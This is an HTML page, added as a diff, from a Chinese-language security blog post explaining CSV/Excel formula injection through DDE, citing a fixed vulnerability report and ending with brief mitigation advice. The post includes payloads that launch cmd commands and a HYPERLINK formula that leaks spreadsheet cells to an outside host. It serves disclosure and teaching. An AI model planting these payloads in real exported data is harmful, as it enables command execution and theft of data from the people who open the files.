@@ -1,0 +1,693 @@
+<!doctype html>
+<html class="theme-next use-motion theme-next-mist">
+<head>
+  
+
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+  <link rel="stylesheet" type="text/css" href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5"/>
+
+
+<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.3"/>
+
+
+    <meta name="description" content="关于计算机科学的学习经历与精彩文章分享。" />
+
+
+
+  <meta name="keywords" content="Phishing," />
+
+
+
+
+
+  <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.3" />
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var CONFIG = {
+    scheme: 'Mist',
+    analytics: {
+      google: ''
+    },
+    sidebar: 'post'
+  };
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?351a523b2429a0dda1b90bb708a00fad";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+  <title> Excel CSV注入 // Neurohazard </title>
+</head>
+
+<body>
+  <!--[if lte IE 8]>
+  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
+    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
+      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
+           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
+           style='margin-left:auto;margin-right:auto;display: block;'/>
+    </a>
+  </div>
+<![endif]-->
+
+  <div class="container one-column page-post-detail">
+    <div class="headband"></div>
+
+    <div id="header" class="header">
+      <div class="header-inner">
+        <h1 class="site-meta">
+  <span class="logo-line-before"><i></i></span>
+  <a href="/" class="brand">
+      <span class="logo">
+        <i class="icon-logo"></i>
+      </span>
+      <span class="site-title">Neurohazard</span>
+  </a>
+  <span class="logo-line-after"><i></i></span>
+</h1>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<div class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu ">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/">
+            <i class="menu-item-icon icon-home"></i> <br />
+            首頁
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            <i class="menu-item-icon icon-about"></i> <br />
+            關於
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            <i class="menu-item-icon icon-archives"></i> <br />
+            歸檔
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            <i class="menu-item-icon icon-tags"></i> <br />
+            標籤
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-friend">
+          <a href="/friend">
+            <i class="menu-item-icon icon-friend"></i> <br />
+            友情鏈接
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-reading-list">
+          <a href="/reading-list">
+            <i class="menu-item-icon icon-reading-list"></i> <br />
+            閱讀清單
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+</div>
+
+
+      </div>
+    </div>
+
+    <div id="main" class="main">
+      <div class="main-inner">
+        <div id="content" class="content">
+          
+
+  <div id="posts" class="posts-expand">
+    
+
+  <div class="post post-type-normal ">
+    <div class="post-header">
+
+      
+      
+        <h1 class="post-title">
+          
+          
+            
+              Excel CSV注入
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          發表於 2016-05-19
+        </span>
+
+        
+          <span class="post-category">
+            &nbsp; | &nbsp; 分類於
+            
+              <a href="/categories/信息安全/">信息安全</a>
+
+              
+              
+
+            
+          </span>
+        
+
+        
+          
+            <span class="post-comments-count">
+            &nbsp; | &nbsp;
+            <a href="/2016/05/19/csv-injection/#comments" >
+              <span class="post-comments-count ds-thread-count" data-thread-key="2016/05/19/csv-injection/"></span>
+            </a>
+          </span>
+          
+        
+      </div>
+    </div>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        <h1 id="快速概览"><a href="#快速概览" class="headerlink" title="快速概览"></a>快速概览</h1><p>关键思路在于将 DDE 命令注入Excel中，可形成任意cmd执行。</p>
+<p>应用场景</p>
+<ol>
+<li>用户在可信域下载excel并运行</li>
+<li>用户直接下载excel并运行</li>
+</ol>
+<h1 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h1><p>现在很多应用提供了导出电子表格的功能（不限于 Web 应用），早在 2014 年 8月 29 日国外 James Kettle 便发表了《Comma Separated Vulnerabilities》文章来讲述导出表格的功能可能会导致注入命令的风险，因为导出的表格数据有很多是来自于用户控制的，如：投票应用、邮箱导出。攻击方式类似于 XSS ：所有的输入都是不可信的。</p>
+<h1 id="0x02-公式注入-amp-DDE"><a href="#0x02-公式注入-amp-DDE" class="headerlink" title="0x02 公式注入 &amp; DDE"></a>0x02 公式注入 &amp; DDE</h1><p>我们知道在 Excel 中是可以运行计算公式的： =1+5，它会将以 = 开头的单元格内容解释成公式并运行，单纯的运行计算公式可能没什么用，但这里可以用到 DDE 。Dynamic Data Exchange（DDE）是一款来自微软的古老技术，它是 Windows 下的一种跨进程通信的协议，支持 Microsoft Excel， LibreOffice 和 Apache OpenOffice。</p>
+<p>执行 cmd 弹出计算器：</p>
+<p>=cmd|’ /C calc’!A0<br><a href="https://ooo.0o0.ooo/2016/05/17/573ada31da5ae.png" target="_blank" rel="external">https://ooo.0o0.ooo/2016/05/17/573ada31da5ae.png</a></p>
+<p>当然也可以使用 -cmd ，+cmd 来执行 DDE ，这个问题在2014年进行了修复（CVE-2014-3524），所以我们现在注入命令执行时软件会有如下的提示：</p>
+<p><a href="https://ooo.0o0.ooo/2016/05/17/573adb7994037.png" target="_blank" rel="external">https://ooo.0o0.ooo/2016/05/17/573adb7994037.png</a></p>
+<p><a href="https://ooo.0o0.ooo/2016/05/17/573adb6c6d9dd.jpg" target="_blank" rel="external">https://ooo.0o0.ooo/2016/05/17/573adb6c6d9dd.jpg</a></p>
+<p>这也就是现在这个漏洞类型的特殊性，虽然软件有着这样的安全风险提醒但仍有大量的厂商承认并修复潜在的漏洞威胁：</p>
+<p><a href="https://hackerone.com/reports/90274" target="_blank" rel="external">https://hackerone.com/reports/90274</a><br><a href="https://hackerone.com/reports/111192" target="_blank" rel="external">https://hackerone.com/reports/111192</a><br>…<br>其中很大的一方面是由于信任域的原因导致用户仍可能受到攻击，用户在 security.com 域下导出自己的Guestbook.csv ，但由于恶意用户偷偷的在留言板中插入了恶意代码：</p>
+<p>=HYPERLINK(“<a href="http://linux.im?test=&quot;&amp;A2&amp;A3,&quot;Error" target="_blank" rel="external">http://linux.im?test=&quot;&amp;A2&amp;A3,&quot;Error</a>: Please click me!”)<br>这样就导致当用户在导出报表后倘若点击了某个单元格则会导致 A2,A3 的单元格内容泄露：</p>
+<p><a href="https://ooo.0o0.ooo/2016/05/17/573adcfad9d32.jpg" target="_blank" rel="external">https://ooo.0o0.ooo/2016/05/17/573adcfad9d32.jpg</a></p>
+<p>所以说这个漏洞是要看背景的，由于它的特殊性（当然也可以配合社工），也就会出现厂商在审核此类漏洞时明明是一个 CSV Injection 漏洞但不会确认修复的情况。</p>
+<h1 id="0x03-实例"><a href="#0x03-实例" class="headerlink" title="0x03 实例"></a>0x03 实例</h1><p>之前报告给腾讯的《CSV Injection on wj.qq.com》漏洞（已经修复）：</p>
+<p><a href="https://ooo.0o0.ooo/2016/05/17/573ade4459a27.png" target="_blank" rel="external">https://ooo.0o0.ooo/2016/05/17/573ade4459a27.png</a></p>
+<p>用户发起投票后，攻击者可以注入CSV 公式/DDE代码，之后管理员进入投票结果页面导出 EXCEL ：</p>
+<p>➜  /tmp cat 465864_seg_1.csv<br>“编号”,”开始答题时间”,”结束答题时间”,”自定义字段”,”1.您使用过xx网吗？”,”2.您的性别”,”3.您的年龄？”,”4.您的婚姻状况”,”5.您的最高学历”,”6.您的月收入（或每月生活费）”,”7.您是否觉得xx网很容易找到”,”8.您对网站logo的满意程度（logo即网站的品牌标识）”,”9.对导航栏目的满意程度”,”10.对网站页面设置及布局的满意程度”,”11.对网站内容编排的满意程度”,”12.对网站色彩风格的满意程度”,”13.对网站字体的满意程度”,”14.与同类网站相比，您对xx上的价格满意吗”,”15.您对xx目前整体的产品质量水平感觉如何”,”16.您觉得xx上的商品信息的可信度怎么样”,”17.您觉得xx的售后服务怎么样”,”18.您觉得xx更新信息的及时性怎么样”,”19.您的咨询或抱怨通常会得到及时的回复吗”,”20.您觉得xx的交易和评价几率真实可靠吗”,”21.您觉得xx网能很好的保证交易时的安全性吗”,”22.123123123”,<br>“1”,”2016-04-27 19:26:45”,”2016-04-27 19:27:27”,””,”A.使用过”,”A.男”,”C.26-30岁”,”B.未婚”,”D.本科”,”I.不方便透露”,”B.否”,”3”,”3”,”3”,”3”,”3”,”3”,”3”,”3”,”3”,”3”,”3”,”A.是”,”A.是”,”A.是”,””,<br>“2”,”2016-04-27 19:27:30”,”2016-04-27 19:28:09”,””,”A.使用过”,”A.男”,”D.31-40岁”,”B.未婚”,”B.高中/中专”,”D.3001-5000元”,”A.是”,”3”,”3”,”4”,”4”,”4”,”4”,”4”,”4”,”4”,”4”,”4”,”A.是”,”B.否”,”A.是”,”=cmd|’/k ipconfig’!A0”,<br>可以看到在用户留言的字段，成功的注入：=cmd|’/k ipconfig’!A0 ，当然也可以通过不触发安全警告的前提下窃取管理员导出的 CSV 数据，也就是前面提到的 =HYPERLINK 。</p>
+<h1 id="0x04-关于全文信息泄露"><a href="#0x04-关于全文信息泄露" class="headerlink" title="0x04 关于全文信息泄露"></a>0x04 关于全文信息泄露</h1><p>之前使用 &amp;A1&amp;A2&amp;A3&amp;A4 窃取表单数据的方式看起来有点笨重，我找到了一种新的方法来更方便的窃取全文信息：<a href="https://support.office.com/en-us/article/CONCAT-function-9b1a9a3f-94ff-41af-9736-694cbd6b4ca2?ui=en-US&amp;rs=en-US&amp;ad=US" target="_blank" rel="external">https://support.office.com/en-us/article/CONCAT-function-9b1a9a3f-94ff-41af-9736-694cbd6b4ca2?ui=en-US&amp;rs=en-US&amp;ad=US</a></p>
+<p>APPLIES TO: Excel 2016, Excel Online, Excel for Android tablets, Excel Mobile, Excel for Android phones, Less.</p>
+<p>2016 之前的 excel 和其他的版本的连接字符串的函数 concatenate 不支持 cell range 的语法，也不能自定义函数，这样的话就没有办法简写，只能生成比较长的url，但 2016 之后的 excel 我们可以使用 concat 函数，支持传入一个 range，比如 concat(A1:A10) ，这样便能直接读取整个表格中的数据。</p>
+<h1 id="0x05-修复方案"><a href="#0x05-修复方案" class="headerlink" title="0x05 修复方案"></a>0x05 修复方案</h1><p>过滤公式所用到的特殊字符（不应盲目过滤），因为个别情况下可能会影响产品的正常功能使用：</p>
+<p>手机号码 +86 xxxxx<br>邮箱地址 @test.com<br>字符串 test-injection<br>…</p>
+<h1 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h1><p><a href="http://www.contextis.com/resources/blog/comma-separated-vulnerabilities/" target="_blank" rel="external">http://www.contextis.com/resources/blog/comma-separated-vulnerabilities/</a><br><a href="http://www.freebuf.com/vuls/102790.html" target="_blank" rel="external">http://www.freebuf.com/vuls/102790.html</a><br><a href="https://hackerone.com/reports/90274" target="_blank" rel="external">https://hackerone.com/reports/90274</a><br><a href="https://support.office.com/en-us/article/CONCAT-function-9b1a9a3f-94ff-41af-9736-694cbd6b4ca2?ui=en-US&amp;rs=en-US&amp;ad=US" target="_blank" rel="external">https://support.office.com/en-us/article/CONCAT-function-9b1a9a3f-94ff-41af-9736-694cbd6b4ca2?ui=en-US&amp;rs=en-US&amp;ad=US</a></p>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] <a href="http://linux.im/2016/05/17/CSV-Injection.html" target="_blank" rel="external">CSV Injection Vulnerability</a></p>
+
+      
+    </div>
+
+    <div class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Phishing/"> #Phishing </a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2016/05/19/html-upload-phishing/">HTML上传/下载文件夹钓鱼</a>
+            
+          </div>
+
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/05/16/bash-shortcuts/">让你提升命令行效率的 Bash 快捷键</a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </div>
+  </div>
+
+
+
+    
+      <div class="post-spread">
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+  <a class="jiathis_button_tsina"></a>
+  <a class="jiathis_button_tqq"></a>
+  <a class="jiathis_button_weixin"></a>
+  <a class="jiathis_button_cqq"></a>
+  <a class="jiathis_button_douban"></a>
+  <a class="jiathis_button_renren"></a>
+  <a class="jiathis_button_qzone"></a>
+  <a class="jiathis_button_kaixin001"></a>
+  <a class="jiathis_button_copy"></a>
+  <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+  <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript" >
+  var jiathis_config={
+    hideMore:false
+  }
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+      </div>
+    
+
+    
+      <div class="comments" id="comments">
+        
+          <div class="ds-thread" data-thread-key="2016/05/19/csv-injection/"
+               data-title="Excel CSV注入" data-url="http://blkstone.github.io/2016/05/19/csv-injection/">
+          </div>
+        
+      </div>
+    
+  </div>
+
+
+        </div>
+
+        
+      </div>
+
+
+      
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目錄
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            本站概覽
+          </li>
+        </ul>
+      
+
+      <div class="site-overview">
+        <div class="site-author motion-element">
+          <img class="site-author-image" src="/images/avatar.jpg" alt="Ray" />
+          <p class="site-author-name">Ray</p>
+        </div>
+        <p class="site-description motion-element">关于计算机科学的学习经历与精彩文章分享。</p>
+        <div class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">178</span>
+              <span class="site-state-item-name">文章</span>
+            </a>
+          </div>
+
+          <div class="site-state-item site-state-categories">
+            
+              <span class="site-state-item-count">12</span>
+              <span class="site-state-item-name">分類</span>
+              
+          </div>
+
+          <div class="site-state-item site-state-tags">
+            <a href="/tags">
+              <span class="site-state-item-count">67</span>
+              <span class="site-state-item-name">標籤</span>
+              </a>
+          </div>
+
+        </div>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+              <a href="https://github.com/BLKStone" target="_blank">GitHub</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">Twitter</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">Weibo</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">DouBan</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">ZhiHu</a>
+            </span>
+            
+          
+        </div>
+
+        
+        
+          <div class="cc-license motion-element">
+            <a href="http://creativecommons.org/licenses/by-nc-sa/4.0" class="cc-opacity" target="_blank">
+              <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
+            </a>
+          </div>
+        
+
+      </div>
+
+      
+        <div class="post-toc-wrap sidebar-panel-active">
+          <div class="post-toc-indicator-top post-toc-indicator"></div>
+          <div class="post-toc">
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#快速概览"><span class="nav-number">1.</span> <span class="nav-text">快速概览</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-概述"><span class="nav-number">2.</span> <span class="nav-text">0x01 概述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-公式注入-amp-DDE"><span class="nav-number">3.</span> <span class="nav-text">0x02 公式注入 & DDE</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-实例"><span class="nav-number">4.</span> <span class="nav-text">0x03 实例</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-关于全文信息泄露"><span class="nav-number">5.</span> <span class="nav-text">0x04 关于全文信息泄露</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x05-修复方案"><span class="nav-number">6.</span> <span class="nav-text">0x05 修复方案</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x06-参考"><span class="nav-number">7.</span> <span class="nav-text">0x06 参考</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考资料"><span class="nav-number">8.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
+            
+          </div>
+          <div class="post-toc-indicator-bottom post-toc-indicator"></div>
+        </div>
+      
+
+    </div>
+  </div>
+
+
+    </div>
+
+    <div id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">
+  
+  &copy; &nbsp;  2015 - 
+  2016
+  <span class="with-love">
+    <i class="icon-heart"></i>
+  </span>
+  <span class="author">Ray</span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 強力驅動
+</div>
+
+<div class="theme-info">
+  主題 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+
+      </div>
+    </div>
+
+    <div class="back-to-top"></div>
+  </div>
+
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.3"></script>
+
+
+  <script type="text/javascript" src="/js/helpers.js?v=0.4.3"></script>
+  
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+  <script type="text/javascript" src="/js/motion_global.js?v=0.4.3" id="motion.global"></script>
+
+
+
+  <script type="text/javascript" src="/js/search-toggle.js"></script>
+
+  
+  
+<script type="text/javascript" src="/js/bootstrap.scrollspy.js?v=0.4.3" id="bootstrap.scrollspy.custom"></script>
+
+
+<script type="text/javascript" id="sidebar.toc.highlight">
+  $(document).ready(function () {
+    var tocSelector = '.post-toc';
+    var $tocSelector = $(tocSelector);
+    var activeCurrentSelector = '.active-current';
+
+    $tocSelector
+      .on('activate.bs.scrollspy', function () {
+        var $currentActiveElement = $(tocSelector + ' .active').last();
+
+        removeCurrentActiveClass();
+        $currentActiveElement.addClass('active-current');
+
+        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
+      })
+      .on('clear.bs.scrollspy', function () {
+        removeCurrentActiveClass();
+      });
+
+    function removeCurrentActiveClass () {
+      $(tocSelector + ' ' + activeCurrentSelector)
+        .removeClass(activeCurrentSelector.substring(1));
+    }
+
+    function processTOC () {
+      getTOCMaxHeight();
+      toggleTOCOverflowIndicators();
+    }
+
+    function getTOCMaxHeight () {
+      var $sidebarInner = $('.sidebar-inner');
+      var height = $('.sidebar').height() -
+                   $tocSelector.position().top -
+                   $('.post-toc-indicator-bottom').height();
+
+      $tocSelector.css('height', height);
+
+      return height;
+    }
+
+    function toggleTOCOverflowIndicators () {
+      tocOverflowIndicator(
+        '.post-toc-indicator-top',
+        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
+      );
+
+      tocOverflowIndicator(
+        '.post-toc-indicator-bottom',
+        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
+      )
+    }
+
+    $(document).on('sidebar.didShow', function () {
+      processTOC();
+    });
+
+    $('body').scrollspy({ target: tocSelector });
+    $(window).on('resize', function () {
+      if ( $('.sidebar').hasClass('sidebar-active') ) {
+        processTOC();
+      }
+    });
+
+    onScroll($tocSelector);
+
+    function onScroll (element) {
+      element.on('mousewheel DOMMouseScroll', function (event) {
+          var oe = event.originalEvent;
+          var delta = oe.wheelDelta || -oe.detail;
+          var self = this;
+
+          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
+          event.preventDefault();
+
+          toggleTOCOverflowIndicators();
+      });
+    }
+
+    function tocOverflowIndicator (indicator, action) {
+      $(indicator).velocity('stop').velocity({
+        opacity: action === 'show' ? 0.4 : 0
+      }, { duration: 100 });
+    }
+
+  });
+</script>
+
+
+  <script type="text/javascript" id="sidebar.nav">
+    $(document).ready(function () {
+      var html = $('html');
+
+      $('.sidebar-nav li').on('click', function () {
+        var item = $(this);
+        var activeTabClassName = 'sidebar-nav-active';
+        var activePanelClassName = 'sidebar-panel-active';
+        if (item.hasClass(activeTabClassName)) {
+          return;
+        }
+
+        var currentTarget = $('.' + activePanelClassName);
+        var target = $('.' + item.data('target'));
+
+        currentTarget.velocity('transition.slideUpOut', 200, function () {
+          target
+            .velocity('stop')
+            .velocity('transition.slideDownIn', 200)
+            .addClass(activePanelClassName);
+        });
+
+        item.siblings().removeClass(activeTabClassName);
+        item.addClass(activeTabClassName);
+      });
+
+      $('.post-toc a').on('click', function (e) {
+        e.preventDefault();
+        var offset = $(escapeSelector(this.getAttribute('href'))).offset().top;
+        html.velocity('stop').velocity('scroll', {
+          offset: offset  + 'px',
+          mobileHA: false
+        });
+      });
+
+      // Expand sidebar on post detail page by default, when post has a toc.
+      var $tocContent = $('.post-toc-content');
+      if (isDesktop() && CONFIG.sidebar === 'post') {
+        if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
+          displaySidebar();
+        }
+      }
+    });
+  </script>
+
+
+
+
+  <script type="text/javascript">
+    $(document).ready(function () {
+      if (CONFIG.sidebar === 'always') {
+        displaySidebar();
+      }
+    });
+  </script>
+
+  
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+      processEscapes: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for (i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+  
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"blkstone"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+
+
+  
+  
+
+</body>
+</html>
